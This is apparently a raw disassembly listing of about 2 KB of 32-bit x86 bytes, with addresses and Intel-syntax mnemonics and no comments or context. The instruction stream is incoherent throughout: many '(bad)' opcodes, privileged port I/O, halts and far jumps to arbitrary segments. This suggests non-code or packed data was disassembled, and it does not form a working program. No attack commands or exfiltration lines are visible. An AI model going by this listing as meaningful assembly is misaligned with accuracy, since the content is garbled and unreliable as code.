  416dbb:	mov    DWORD PTR ds:0x52136ce4,edx
  416dc1:	clc    
  416dc2:	xchg   esi,eax
  416dc3:	(bad)  
  416dc4:	mov    ds:0xf8195c83,al
  416dc9:	inc    edx
  416dca:	and    eax,0x4c595704
  416dcf:	das    
  416dd0:	xor    bl,BYTE PTR [edx]
  416dd2:	fcomp  DWORD PTR [ebp-0x46914b0c]
  416dd8:	and    DWORD PTR [ecx+ecx*4],esp
  416ddb:	push   es
  416ddc:	pop    edx
  416ddd:	addr16 push esi
  416ddf:	xor    eax,0x81772081
  416de4:	popf   
  416de5:	retf   0x63da
  416de8:	mov    ebp,0xfae41a61
  416ded:	add    DWORD PTR [edi-0xde447a4],edx
  416df3:	dec    edi
  416df4:	xlat   BYTE PTR ds:[ebx]
  416df5:	out    dx,eax
  416df6:	jmp    0x416e53
  416df8:	add    WORD PTR [edx-0x43],0x25
  416dfd:	sbb    edi,DWORD PTR [esi-0x61]
  416e00:	neg    DWORD PTR [eax-0x64c966a2]
  416e06:	fbld   TBYTE PTR [edx-0x35cb1909]
  416e0c:	arpl   sp,ax
  416e0e:	push   ebp
  416e0f:	cmp    eax,0xf4d100d6
  416e14:	leave  
  416e15:	stos   BYTE PTR es:[edi],al
  416e16:	std    
  416e17:	fisttp DWORD PTR [edx-0x938eba]
  416e1d:	pop    ss
  416e1e:	push   esi
  416e1f:	mov    ds:0x50dd279e,al
  416e24:	pop    ds
  416e25:	cld    
  416e26:	sbb    DWORD PTR [ecx+0x13],esi
  416e29:	lods   eax,DWORD PTR ds:[esi]
  416e2a:	dec    ebx
  416e2b:	sti    
  416e2c:	ret    0xf93a
  416e2f:	repnz mov ebp,0x3224c18d
  416e35:	jmp    0xd049:0x3b02ffc1
  416e3c:	lea    eax,[ebp-0xa1bfac4]
  416e42:	loope  0x416e56
  416e44:	xchg   DWORD PTR ds:0xd6197172,ebx
  416e4a:	into   
  416e4b:	ud2    
  416e4d:	jnp    0x416e5b
  416e4f:	out    dx,al
  416e50:	pop    edi
  416e51:	push   0x4b
  416e53:	xchg   ecx,eax
  416e54:	mov    DWORD PTR [eax-0x46],ecx
  416e57:	std    
  416e58:	retf   
  416e59:	adc    BYTE PTR [esi+0x67],al
  416e5c:	inc    edx
  416e5d:	adc    al,0x73
  416e5f:	in     eax,dx
  416e60:	adc    al,0x96
  416e62:	pop    ecx
  416e63:	push   ebx
  416e64:	data16 mov dl,0xcc
  416e67:	int    0x3a
  416e69:	push   ebx
  416e6a:	jnp    0x416edf
  416e6c:	xor    BYTE PTR [ebp+0x1],ch
  416e6f:	in     al,0x9a
  416e71:	addr16 inc ebx
  416e73:	and    BYTE PTR [eax],bl
  416e75:	pop    eax
  416e76:	cld    
  416e77:	outs   dx,BYTE PTR ds:[esi]
  416e78:	fstp   DWORD PTR [eax+0x4a]
  416e7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e7c:	jo     0x416e40
  416e7e:	xchg   ebx,eax
  416e7f:	adc    DWORD PTR [eax-0x16],ebx
  416e82:	cmc    
  416e83:	fstp   DWORD PTR fs:[ebp-0x17a78a4d]
  416e8a:	ret    
  416e8b:	cli    
  416e8c:	mov    ebx,0xec8b116b
  416e91:	xchg   esp,eax
  416e92:	repz jmp 0x6ee1a523
  416e98:	imul   ebx,ebx,0x40
  416e9b:	mov    cx,0xc1f1
  416e9f:	ins    DWORD PTR es:[edi],dx
  416ea0:	lea    edi,[edi-0x34]
  416ea3:	mov    al,dh
  416ea5:	sahf   
  416ea6:	adc    al,0xe1
  416ea8:	sbb    dh,dl
  416eaa:	retf   
  416eab:	not    BYTE PTR [edi]
  416ead:	lds    edx,FWORD PTR [ebp-0x24]
  416eb0:	rcl    BYTE PTR [eax+eiz*1+0x5156e73a],1
  416eb7:	push   ebx
  416eb8:	lock (bad) 
  416eba:	push   eax
  416ebb:	lods   eax,DWORD PTR ds:[esi]
  416ebc:	sbb    al,0xfb
  416ebe:	cmp    BYTE PTR [edi-0x4a9fcb48],al
  416ec4:	jg     0x416ed5
  416ec6:	xor    BYTE PTR [edx],dh
  416ec8:	or     al,0xde
  416eca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ecb:	pop    ebx
  416ecc:	test   BYTE PTR [edi-0x309705b1],0x5
  416ed3:	fisttp DWORD PTR [ebx]
  416ed5:	fwait
  416ed6:	dec    ebp
  416ed7:	lock mov eax,ds:0x3d22a4e8
  416edd:	imul   edi,esp,0xffffffd1
  416ee0:	xlat   BYTE PTR ds:[ebx]
  416ee1:	and    al,0xe0
  416ee3:	cld    
  416ee4:	dec    ebx
  416ee5:	out    0x1d,al
  416ee7:	mov    ds:0x96daf5c7,al
  416eec:	sbb    al,0xe4
  416eee:	addr16 ds (bad) 
  416ef1:	mov    ebp,0xc777a55e
  416ef6:	test   eax,edx
  416ef8:	imul   ebx,DWORD PTR [esi+0x3b],0x36
  416efc:	mov    bl,0xfc
  416efe:	mov    esi,0x6ae7de6b
  416f03:	mov    cl,BYTE PTR [ecx-0xdf6c362]
  416f09:	xchg   ebp,eax
  416f0a:	test   ebp,eax
  416f0c:	jns    0x416ee9
  416f0e:	inc    ebp
  416f0f:	bound  esp,QWORD PTR [edi+0x49]
  416f12:	hlt    
  416f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f14:	in     al,0x8d
  416f16:	xchg   esp,eax
  416f17:	mov    ch,0xdb
  416f19:	adc    eax,0x61e59be1
  416f1e:	mov    edx,0x94ed2b04
  416f23:	cmp    eax,0xc32f4130
  416f28:	mov    al,ds:0xfb891188
  416f2d:	cmp    al,0x45
  416f2f:	lods   eax,DWORD PTR ds:[esi]
  416f30:	jno    0x416f3b
  416f32:	fdiv   DWORD PTR [edi-0x67fdba89]
  416f38:	imul   esp,DWORD PTR [esi],0xffffffa8
  416f3b:	aaa    
  416f3c:	mov    esp,0xb286b3c2
  416f41:	dec    edi
  416f42:	dec    edi
  416f43:	xchg   ebx,eax
  416f44:	mov    ds:0x7199a9e3,al
  416f49:	push   esp
  416f4a:	jp     0x416f44
  416f4c:	hlt    
  416f4d:	in     al,0x74
  416f4f:	sbb    dl,BYTE PTR [ebx+0x35]
  416f52:	(bad)
  416f56:	mov    dl,0x3d
  416f58:	cmp    eax,0xded52d63
  416f5d:	xchg   BYTE PTR [ebx-0x7c5defe],al
  416f63:	push   edi
  416f64:	sbb    DWORD PTR [edx+ebp*8-0x68],ebx
  416f68:	sub    cl,BYTE PTR [edx+0x33abb13f]
  416f6e:	inc    esp
  416f6f:	jmp    0x989b:0x465739ca
  416f76:	mov    DWORD PTR [ecx+0x6acd2e38],eax
  416f7c:	adc    DWORD PTR [ebx-0x38a74c67],esp
  416f82:	stos   DWORD PTR es:[edi],eax
  416f83:	push   esi
  416f84:	and    BYTE PTR [ebx+0x2221b8e4],ah
  416f8a:	add    ch,bh
  416f8c:	ss stos DWORD PTR es:[edi],eax
  416f8e:	jne    0x416f35
  416f90:	and    BYTE PTR [edi-0xe],bl
  416f93:	arpl   WORD PTR ds:0x4e38f38e,di
  416f99:	ret    0x98a9
  416f9c:	xchg   edx,eax
  416f9d:	clc    
  416f9e:	pop    ecx
  416f9f:	jbe    0x416f80
  416fa1:	dec    esi
  416fa2:	mov    esp,0x496e6f85
  416fa7:	jecxz  0x416f7a
  416fa9:	lahf   
  416faa:	int    0x7b
  416fac:	test   DWORD PTR [edx+ecx*2+0x30],esp
  416fb0:	shl    bh,0x91
  416fb3:	jecxz  0x417029
  416fb5:	retf   0x7fb
  416fb8:	fbld   TBYTE PTR [edi]
  416fba:	jae    0x416fe7
  416fbc:	dec    edi
  416fbd:	cmc    
  416fbe:	push   eax
  416fbf:	mov    al,ds:0x8890a718
  416fc4:	ja     0x416f51
  416fc6:	push   cs
  416fc7:	dec    edi
  416fc8:	inc    ecx
  416fc9:	sar    al,0x49
  416fcc:	je     0x416fb8
  416fce:	sahf   
  416fcf:	adc    DWORD PTR [ecx-0x36],0xffffffe8
  416fd3:	or     DWORD PTR [edx+0x3532dbc7],ebp
  416fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fda:	out    0x1a,al
  416fdc:	xor    edx,eax
  416fde:	adc    al,0xf7
  416fe0:	jmp    0x78e8:0xfe1276bf
  416fe7:	je     0x416fc5
  416fe9:	cs push 0xc18665b0
  416fef:	pop    ds
  416ff0:	stc    
  416ff1:	into   
  416ff2:	push   edi
  416ff3:	outs   dx,BYTE PTR ds:[esi]
  416ff4:	(bad)  
  416ff5:	outs   dx,DWORD PTR ds:[esi]
  416ff6:	mov    ebp,0x996b5dcc
  416ffb:	fild   QWORD PTR [eax-0x40bf9ae9]
  417001:	sub    DWORD PTR [ebp-0x46a5bf5d],0xfffffff3
  417008:	and    al,0xc1
  41700a:	dec    ebx
  41700b:	or     BYTE PTR [edi-0x9],cl
  41700e:	or     eax,0x47e6bd00
  417013:	inc    ecx
  417014:	adc    DWORD PTR [edx],ebx
  417016:	out    0x8b,eax
  417018:	stos   DWORD PTR es:[edi],eax
  417019:	fdiv   QWORD PTR [esi+0xb]
  41701c:	ret    0x7785
  41701f:	fnstsw WORD PTR [edi-0x25]
  417022:	repnz cmc 
  417024:	xchg   esi,eax
  417025:	aaa    
  417026:	mul    DWORD PTR [ecx-0x3c]
  417029:	xor    eax,0x70a00d3a
  41702e:	jbe    0x41704f
  417030:	in     eax,dx
  417031:	mov    al,ds:0x8ebc4d65
  417036:	arpl   di,dx
  417038:	add    ch,BYTE PTR [eax-0x74]
  41703b:	pop    eax
  41703c:	dec    eax
  41703d:	mov    esi,0xb9472b80
  417042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417043:	js     0x4170c2
  417045:	inc    esi
  417046:	(bad)  
  417047:	repz ja 0x417058
  41704a:	add    esi,esi
  41704c:	dec    esi
  41704d:	pop    ds
  41704e:	int3   
  41704f:	les    esp,FWORD PTR [esi+0x5d]
  417052:	das    
  417053:	outs   dx,DWORD PTR ds:[esi]
  417054:	pusha  
  417055:	shr    BYTE PTR [eax],1
  417057:	cmp    BYTE PTR [ecx],al
  417059:	mov    BYTE PTR [ebx+0x53],ah
  41705c:	cmp    al,0x1a
  41705e:	sub    edx,esp
  417060:	rcr    ebp,0x21
  417063:	test   eax,0xfac94627
  417068:	sub    al,dh
  41706a:	mov    ah,bh
  41706c:	and    DWORD PTR [ebx+0x1a1dd1e0],edx
  417072:	mov    al,ds:0x2edae231
  417077:	mov    ch,0x97
  417079:	add    BYTE PTR [edi],bh
  41707b:	push   esp
  41707c:	mov    ch,0x9c
  41707e:	xor    BYTE PTR es:[esi-0x7],ah
  417082:	leave  
  417083:	repnz shl DWORD PTR [edi+0x45],1
  417087:	xlat   BYTE PTR ds:[ebx]
  417088:	jno    0x41702d
  41708a:	adc    eax,0xf55e8a86
  41708f:	sub    esi,edi
  417091:	mov    ds:0x8b201267,eax
  417096:	(bad)  
  417097:	cmp    esp,DWORD PTR [edx]
  417099:	test   eax,0x85dcc492
  41709e:	add    DWORD PTR [esi+0x4f],eax
  4170a1:	xchg   edi,eax
  4170a2:	mov    ah,0x2e
  4170a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170a5:	cdq    
  4170a6:	cmc    
  4170a7:	(bad)  
  4170a8:	pop    ebx
  4170a9:	or     BYTE PTR [edx+0x5c],0x2c
  4170ad:	ja     0x417050
  4170af:	jo     0x4170b9
  4170b1:	cmp    ah,bh
  4170b3:	fs mov al,0xd6
  4170b6:	adc    al,0x0
  4170b8:	(bad)  
  4170b9:	stc    
  4170ba:	leave  
  4170bb:	pusha  
  4170bc:	mov    ebx,0xef11587b
  4170c1:	rcl    BYTE PTR [edx],1
  4170c3:	push   es
  4170c4:	fdivr  DWORD PTR [eax]
  4170c6:	mov    edi,cs
  4170c8:	movups XMMWORD PTR [ecx+0x258e6121],xmm2
  4170cf:	mov    eax,0xd4c0d678
  4170d4:	ret    
  4170d5:	sti    
  4170d6:	fsincos 
  4170d8:	nop
  4170d9:	add    BYTE PTR [ebx+0x2d],dl
  4170dc:	sbb    esp,DWORD PTR [eax]
  4170de:	xor    eax,edx
  4170e0:	dec    ecx
  4170e1:	data16 sar BYTE PTR [ebx],0xdb
  4170e5:	lea    eax,[eax+0x273f37c9]
  4170eb:	(bad)  [esi+0x60b867fd]
  4170f1:	mov    dh,0x8f
  4170f3:	iret   
  4170f4:	loop   0x4170b8
  4170f6:	in     al,dx
  4170f7:	aas    
  4170f8:	push   cs
  4170f9:	jno    0x4170e3
  4170fb:	shl    ah,1
  4170fd:	fs (bad) 
  4170ff:	sti    
  417100:	pop    edx
  417101:	inc    BYTE PTR [esp+eax*4+0x70]
  417105:	addr16 out dx,al
  417107:	lock lds esp,FWORD PTR cs:[ecx]
  41710b:	enter  0xcc84,0x41
  41710f:	adc    BYTE PTR [eax],bh
  417111:	jns    0x41710f
  417113:	add    dl,al
  417115:	cmp    dl,BYTE PTR [edi]
  417117:	int3   
  417118:	mov    bl,0xf5
  41711a:	cmp    eax,0x5bbe84fa
  41711f:	jo     0x41719e
  417121:	dec    edi
  417122:	cmp    ah,bl
  417124:	xchg   DWORD PTR [eax+0x3b],eax
  417127:	fiadd  DWORD PTR ds:0x817ec10d
  41712d:	xor    ch,BYTE PTR [ebx+0x29]
  417130:	mov    al,ds:0xe4f9667b
  417135:	or     DWORD PTR [ebp+0x395cf73a],esp
  41713b:	popa   
  41713c:	push   DWORD PTR [eax]
  41713e:	jp     0x4171b3
  417140:	jae    0x417146
  417142:	inc    ebx
  417143:	pop    ebx
  417144:	popf   
  417145:	push   ebx
  417146:	aaa    
  417147:	pusha  
  417148:	popf   
  417149:	(bad)  
  41714a:	in     al,0x6d
  41714c:	mov    bh,0x59
  41714e:	jl     0x417180
  417150:	mov    esp,0xc27a426e
  417155:	cmp    ah,BYTE PTR [edx+0x6543efd2]
  41715b:	shl    DWORD PTR [eax],1
  41715d:	into   
  41715e:	(bad)  
  41715f:	push   0x494f79b4
  417164:	inc    ecx
  417165:	jnp    0x417132
  417167:	fdiv   QWORD PTR [eax+0x7839aee3]
  41716d:	loop   0x4171a1
  41716f:	shr    BYTE PTR [esi-0x313efc44],cl
  417175:	test   DWORD PTR [ebx+ecx*1-0x42],ecx
  417179:	cli    
  41717a:	ss leave 
  41717c:	rol    DWORD PTR [eax],cl
  41717e:	inc    ebp
  41717f:	idiv   BYTE PTR [ebx-0x53]
  417182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417183:	out    0x5c,eax
  417185:	repz pop eax
  417187:	gs (bad) 
  417189:	in     al,dx
  41718a:	sub    al,BYTE PTR [edi]
  41718c:	addr16 out 0x92,al
  41718f:	jp     0x4171b2
  417191:	mov    esi,0x9290bd87
  417196:	and    eax,0xbcd2b720
  41719b:	fnsave [eax-0x7bf531a2]
  4171a1:	dec    esi
  4171a2:	jno    0x417174
  4171a4:	sti    
  4171a5:	enter  0x8484,0xdd
  4171a9:	outs   dx,DWORD PTR ds:[esi]
  4171aa:	(bad)  
  4171ab:	scas   al,BYTE PTR es:[edi]
  4171ac:	jmp    0x163b:0x862fd7a
  4171b3:	cli    
  4171b4:	pop    ds
  4171b5:	sub    edx,DWORD PTR [ebx+0x4e]
  4171b8:	in     eax,0x74
  4171ba:	adc    eax,0x16907e18
  4171bf:	sbb    bl,BYTE PTR [esi-0xcd8783f]
  4171c5:	xchg   ebp,eax
  4171c6:	xchg   ecx,eax
  4171c7:	lods   eax,DWORD PTR ds:[esi]
  4171c8:	sub    al,0x68
  4171ca:	inc    ebx
  4171cb:	fidiv  WORD PTR [edi+0x36c7fdf]
  4171d1:	push   ebx
  4171d2:	mov    cl,0xf2
  4171d4:	hlt    
  4171d5:	(bad)  
  4171d6:	aaa    
  4171d7:	jne    0x41721f
  4171d9:	gs (bad) 
  4171dc:	and    DWORD PTR [edi],0xc8d2be58
  4171e2:	outs   dx,BYTE PTR ds:[esi]
  4171e3:	and    eax,0xb5cf5255
  4171e8:	or     eax,0x3745314d
  4171ed:	arpl   WORD PTR [esp+eiz*4-0xfe35816],bx
  4171f4:	in     eax,dx
  4171f5:	adc    DWORD PTR [eax-0x7892bbc2],edx
  4171fb:	mov    bh,0xda
  4171fd:	es or  eax,0x16d2c9a2
  417203:	shl    BYTE PTR [ebx-0x2a6a9e60],cl
  417209:	push   ecx
  41720a:	xor    dh,cl
  41720c:	inc    edx
  41720d:	mov    BYTE PTR [edi],dl
  41720f:	frstor [ebp-0x6e]
  417212:	(bad)  
  417213:	sub    eax,0x2e67deac
  417218:	(bad)  
  417219:	je     0x64634217
  41721f:	repz push esp
  417221:	dec    esp
  417222:	xchg   edi,eax
  417223:	loopne 0x417272
  417225:	xor    ch,BYTE PTR [ecx]
  417227:	scas   al,BYTE PTR es:[edi]
  417228:	movaps xmm1,XMMWORD PTR [esi]
  41722b:	jg     0x4171d4
  41722d:	aas    
  41722e:	adc    eax,0x5cfeebb5
  417233:	add    eax,0x7d1d5170
  417238:	icebp  
  417239:	pop    ss
  41723a:	xchg   ebp,eax
  41723b:	dec    ebp
  41723c:	fcomp  QWORD PTR [ebp+0x33]
  41723f:	jb     0x417277
  417241:	or     DWORD PTR [ebp-0x76],0x13
  417245:	push   edx
  417246:	shl    dh,0xfa
  417249:	scas   eax,DWORD PTR es:[edi]
  41724a:	pusha  
  41724b:	push   ss
  41724c:	sbb    ebp,edi
  41724e:	fmul   QWORD PTR [esi]
  417250:	mov    bh,0x6c
  417252:	or     eax,DWORD PTR [edi+0x1c]
  417255:	stos   DWORD PTR es:[edi],eax
  417256:	int    0xcc
  417258:	mov    WORD PTR [edx+0x2e8ad6d4],ss
  41725e:	loop   0x41721e
  417260:	jecxz  0x41720f
  417262:	imul   ebx,DWORD PTR [ecx+0x41f2b397],0x38
  417269:	sbb    esi,ebx
  41726b:	inc    edi
  41726c:	ja     0x41728c
  41726e:	xchg   ebp,eax
  41726f:	inc    ecx
  417270:	mov    ebx,0xf43b5e5e
  417275:	sbb    eax,0xe01ec0f0
  41727a:	clc    
  41727b:	dec    ebx
  41727c:	leave  
  41727d:	ret    0x423f
  417280:	push   eax
  417281:	repz popf 
  417283:	pop    ss
  417284:	sbb    DWORD PTR [ecx],ebp
  417286:	pop    es
  417287:	mov    WORD PTR [ecx-0x3c90f270],fs
  41728d:	adc    eax,0x9a3c330a
  417292:	pop    ecx
  417293:	loope  0x4172c9
  417295:	pop    edx
  417296:	mov    ebx,0x829046ba
  41729b:	jle    0x417226
  41729d:	ret    0x8db6
  4172a0:	mov    bh,0x90
  4172a2:	int3   
  4172a3:	idiv   DWORD PTR [eax+ebx*8+0x20]
  4172a7:	dec    eax
  4172a8:	pop    edx
  4172a9:	pushf  
  4172aa:	addr16 out 0x9c,eax
  4172ad:	retf   0x37d
  4172b0:	lods   eax,DWORD PTR ds:[esi]
  4172b1:	(bad)  
  4172b2:	sub    BYTE PTR [ebx],bh
  4172b4:	push   eax
  4172b5:	jmp    0x41726d
  4172b7:	jmp    0x417242
  4172b9:	and    ah,ah
  4172bb:	(bad)  [edi+0x3c27b8b6]
  4172c1:	push   ebx
  4172c2:	call   0x4522:0x3fb3b6b
  4172c9:	mov    bl,0xa0
  4172cb:	mov    cs:0x686250e8,eax
  4172d1:	and    edi,DWORD PTR [eax+esi*1-0x403316cc]
  4172d8:	pop    es
  4172d9:	lods   eax,DWORD PTR ds:[esi]
  4172da:	jmp    0x4cf8:0xcf1dd1a5
  4172e1:	daa    
  4172e2:	inc    eax
  4172e3:	or     DWORD PTR cs:[esi],eax
  4172e6:	ins    BYTE PTR es:[edi],dx
  4172e7:	rol    BYTE PTR cs:[edx],cl
  4172ea:	xchg   al,bh
  4172ec:	ficomp DWORD PTR [esi]
  4172ee:	xor    cl,dh
  4172f0:	je     0x417287
  4172f2:	jbe    0x4172f6
  4172f4:	shl    DWORD PTR [ebx],cl
  4172f6:	gs mov al,0x30
  4172f9:	daa    
  4172fa:	clc    
  4172fb:	sahf   
  4172fc:	into   
  4172fd:	sbb    al,0xe6
  4172ff:	out    0x65,al
  417301:	add    esp,DWORD PTR [ebx-0x31]
  417304:	xchg   edx,eax
  417305:	(bad)  
  417306:	mov    ds:0x7b73493a,al
  41730b:	inc    edi
  41730c:	mov    edi,0x4d9ce9e2
  417311:	repz (bad) 
  417313:	hlt    
  417314:	cli    
  417315:	jne    0x4172de
  417317:	fst    st(3)
  417319:	and    al,0xb4
  41731b:	push   esp
  41731c:	in     eax,0xb5
  41731e:	adc    ah,BYTE PTR [ecx-0x970946]
  417324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417325:	dec    esi
  417326:	call   0x48af73de
  41732b:	sar    DWORD PTR [ebp-0x288db1d6],1
  417331:	(bad)  
  417332:	in     eax,dx
  417333:	icebp  
  417334:	sbb    BYTE PTR [ecx],0xbb
  417337:	inc    esi
  417338:	repz cmp ch,cl
  41733b:	adc    ebx,DWORD PTR [edi]
  41733d:	(bad)  
  41733e:	sbb    bl,BYTE PTR [eax]
  417340:	(bad)  
  417341:	or     eax,0x30a8c212
  417346:	mov    bh,0xa4
  417348:	in     al,dx
  417349:	(bad)  
  41734a:	push   edi
  41734b:	imul   dh
  41734d:	push   es
  41734e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417350:	mov    DWORD PTR [edx+0x12],esp
  417353:	ret    0x43ae
  417356:	xor    dh,BYTE PTR [edi+ebp*4+0x3afbd855]
  41735d:	push   esi
  41735e:	add    al,0xbc
  417360:	mov    ebx,0x4a48f074
  417365:	pop    es
  417366:	int3   
  417367:	mov    ah,0x9f
  417369:	xlat   BYTE PTR ds:[ebx]
  41736a:	mov    gs,WORD PTR [esi+0x7]
  41736d:	and    ebx,eax
  41736f:	fcomp  QWORD PTR [edi-0x62]
  417372:	adc    DWORD PTR [edi-0x1a],ebx
  417375:	(bad)  
  417376:	fsubr  QWORD PTR [edx+ebx*4-0x6cb0fe91]
  41737d:	jp     0x4173e9
  41737f:	add    eax,0x184efdd6
  417384:	add    bl,bh
  417386:	jl     0x4173a3
  417388:	aaa    
  417389:	pop    ebx
  41738a:	mov    ch,0x92
  41738c:	mov    ds:0x8ed25e40,al
  417391:	popf   
  417392:	retf   
  417393:	fs mov edi,0xd9ff4937
  417399:	and    BYTE PTR [ebp-0x1dffcc4d],ch
  41739f:	push   edi
  4173a0:	(bad)  
  4173a1:	jo     0x417338
  4173a3:	xor    BYTE PTR [esi],0xe0
  4173a6:	mov    ebp,0xc7378d16
  4173ab:	retf   
  4173ac:	aad    0x1c
  4173ae:	fwait
  4173af:	lahf   
  4173b0:	cdq    
  4173b1:	loop   0x4173ad
  4173b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173b4:	mov    DWORD PTR [esi-0x6b81cc2a],eax
  4173ba:	outs   dx,BYTE PTR ds:[esi]
  4173bb:	ror    BYTE PTR [esi],cl
  4173bd:	adc    ch,ah
  4173bf:	ss fsub st(6),st
  4173c2:	les    edi,FWORD PTR [esi+0x6e]
  4173c5:	int    0x85
  4173c7:	and    ch,cl
  4173c9:	hlt    
  4173ca:	pop    ss
  4173cb:	inc    edi
  4173cc:	lea    eax,[esi-0x7fd8ee22]
  4173d2:	out    0xc1,eax
  4173d4:	jle    0x4173b2
  4173d6:	jae    0x41736e
  4173d8:	aad    0x7e
  4173da:	inc    ecx
  4173db:	test   al,0xad
  4173dd:	popf   
  4173de:	dec    edi
  4173df:	mov    esp,0x1aa0c497
  4173e4:	mov    bl,0x1f
  4173e6:	xchg   ebp,eax
  4173e7:	jmp    0x7f2fc992
  4173ec:	das    
  4173ed:	add    eax,0xea732df0
  4173f2:	jae    0x41740b
  4173f4:	and    eax,ebx
  4173f6:	in     al,0x9
  4173f8:	adc    ebx,DWORD PTR [edx]
  4173fa:	xchg   edi,eax
  4173fb:	daa    
  4173fc:	das    
  4173fd:	int    0x1c
  4173ff:	cs lock leave 
  417402:	sbb    eax,0x1247bbf9
  417407:	xor    ah,bh
  417409:	sub    BYTE PTR [ebp+0x48],0xfb
  41740d:	repz xlat BYTE PTR ds:[ebx]
  41740f:	call   0xeb6a:0xcf763c12
  417416:	fmul   st(5),st
  417418:	sbb    BYTE PTR [ebx+0x584d6f0d],ah
  41741e:	or     dh,BYTE PTR [edx]
  417420:	fimul  DWORD PTR [eax+0xa]
  417423:	adc    DWORD PTR [esp+eiz*2-0x2e5c8dd0],eax
  41742a:	daa    
  41742b:	cmp    bh,dh
  41742d:	dec    BYTE PTR [ecx-0x14b33546]
  417433:	or     DWORD PTR es:[edx-0x6cb30629],0x38
  41743b:	pop    es
  41743c:	push   esi
  41743d:	cld    
  41743e:	pop    esp
  41743f:	lods   al,BYTE PTR ds:[esi]
  417440:	mov    esi,0x6c0d58b6
  417445:	fisub  WORD PTR [esi-0x54aa2b01]
  41744b:	push   0xfffffff4
  41744d:	adc    eax,0x7c00a3cc
  417452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417453:	inc    ebx
  417454:	repz sbb BYTE PTR [ebx-0x630afe90],ch
  41745b:	xchg   esp,eax
  41745c:	xchg   DWORD PTR [esi],esi
  41745e:	pop    eax
  41745f:	cmp    BYTE PTR [edx-0x23],bh
  417462:	or     ah,BYTE PTR [esi-0x3f]
  417465:	call   0xf903:0xb896f726
  41746c:	cmp    BYTE PTR [ecx+0x3c0cb6e7],dh
  417472:	popa   
  417473:	pop    ecx
  417474:	push   esp
  417475:	push   cs
  417476:	inc    ebx
  417477:	repnz or ecx,eax
  41747a:	inc    ebp
  41747b:	lock sbb eax,0xe373a634
  417481:	add    al,0xb9
  417483:	stc    
  417484:	inc    ebp
  417485:	xchg   ebx,eax
  417486:	sub    al,0xd8
  417488:	cmp    BYTE PTR [ebx-0x5065fec4],0xe6
  41748f:	xchg   ebp,eax
  417490:	inc    ecx
  417491:	push   0x36
  417493:	push   edi
  417494:	outs   dx,BYTE PTR ds:[esi]
  417495:	jle    0x417515
  417497:	or     DWORD PTR [edi-0x76e28868],ebp
  41749d:	jle    0x417440
  41749f:	std    
  4174a0:	daa    
  4174a1:	iret   
  4174a2:	sub    eax,0x1cbc8c20
  4174a7:	cmp    BYTE PTR [ecx+0x5c],bl
  4174aa:	aad    0xce
  4174ac:	in     al,dx
  4174ad:	adc    al,0xcf
  4174af:	bound  esp,QWORD PTR [edi+ecx*1-0x22]
  4174b3:	xchg   ebp,ebx
  4174b5:	sbb    BYTE PTR [edi+0x7d2ff550],bl
  4174bb:	dec    esi
  4174bc:	sbb    ebx,DWORD PTR [edi-0x6dd1df5e]
  4174c2:	int3   
  4174c3:	loopne 0x417515
  4174c5:	fild   DWORD PTR [edi+0x3]
  4174c8:	xchg   edi,eax
  4174c9:	and    DWORD PTR [edi+0x27],0x1e0aabe0
  4174d0:	push   es
  4174d1:	clc    
  4174d2:	loope  0x417515
  4174d4:	xchg   esp,eax
  4174d5:	js     0x4174c8
  4174d7:	and    eax,0x3ea3d7ad
  4174dc:	inc    edx
  4174dd:	xchg   edx,eax
  4174de:	xor    edi,DWORD PTR [eax+0x42]
  4174e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174e2:	mov    ebp,0x6ad682c8
  4174e7:	mov    eax,0xd2897b63
  4174ec:	dec    ebx
  4174ed:	imul   ecx,esp,0xffffffe6
  4174f0:	cmc    
  4174f1:	mov    ch,BYTE PTR [ebx-0x56d8c42a]
  4174f7:	sub    al,0x34
  4174f9:	mov    al,ds:0x6aa09aa8
  4174fe:	loop   0x4174cd
  417500:	jmp    0x81c792fb
  417505:	dec    ecx
  417506:	push   ebx
  417507:	nop
  417508:	or     al,0x54
  41750a:	sbb    eax,0x447d1a6c
  41750f:	sbb    al,0x3f
  417511:	cli    
  417512:	jle    0x4174c3
  417514:	ds iret 
  417516:	xchg   DWORD PTR [esi],esp
  417518:	pop    esp
  417519:	xor    bl,ah
  41751b:	in     eax,dx
  41751c:	dec    ebp
  41751d:	mov    ds:0x29f9e4f,al
  417522:	sub    BYTE PTR [eax],bh
  417524:	xor    edx,DWORD PTR [edx-0x460f08d]
  41752a:	icebp  
  41752b:	call   0x6953:0x6507b566
  417532:	pop    esp
  417533:	sti    
  417534:	jae    0x417559
  417536:	stos   BYTE PTR es:[edi],al
  417537:	add    al,0x3
  417539:	ja     0x4174da
  41753b:	mov    al,0xd7
  41753d:	add    eax,0x1fb10948
  417542:	mov    ecx,0xa640e31f
  417547:	inc    ebp
  417548:	cwde   
  417549:	push   ds
  41754a:	jmp    0x59c2:0xb4dce253
  417551:	aas    
  417552:	mov    ah,0x8b
  417554:	pop    ebx
  417555:	scas   al,BYTE PTR es:[edi]
  417556:	cmp    BYTE PTR fs:[edx+eax*1],al
  41755a:	adc    esi,DWORD PTR [edi+0x12]
  41755d:	jne    0x41751d
  41755f:	push   eax
  417560:	adc    al,bh
  417562:	mov    ebx,0x272620
  417567:	icebp  
  417568:	mov    esp,0x9c6ece8d
  41756d:	cmp    eax,0x10f6e65
  417572:	xor    cl,ah
  417574:	mov    esi,0x9bcc259c
  417579:	fwait
  41757a:	jle    0x417532
  41757c:	xchg   edx,eax
  41757d:	inc    edi
  41757e:	loope  0x417551
  417580:	push   edi
  417581:	clc    
  417582:	mov    al,ds:0x5ac0678f
  417587:	ds mov esi,0x6b55b097
  41758d:	shl    ebx,cl
  41758f:	or     edx,esi
  417591:	mov    esi,0xd1cd5df3
  417596:	ror    DWORD PTR [edi+0x2b7406a1],1
  41759c:	pusha  
  41759d:	mov    BYTE PTR [esi+ebp*4],dh
  4175a0:	loop   0x4175f3
  4175a2:	in     al,0xdd
  4175a4:	enter  0x8410,0x5e
  4175a8:	mov    dh,0x4e
